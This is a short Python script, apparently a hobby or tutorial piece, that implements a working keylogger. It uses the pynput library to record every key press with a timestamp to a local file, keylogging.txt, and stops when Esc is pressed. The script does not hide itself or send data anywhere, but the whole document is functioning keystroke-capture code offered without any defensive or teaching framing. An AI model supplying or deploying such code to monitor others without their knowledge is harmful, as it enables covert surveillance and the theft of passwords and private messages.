from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylogging.txt"), level=logging.DEBUG, format='%(message)s : %(asctime)s')

def while_press(key):
    KEY="{0} is pressed at ".format(key)
    logging.info(str(KEY))
 
def while_release(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=while_press , on_release=while_release) as listener:
    listener.join()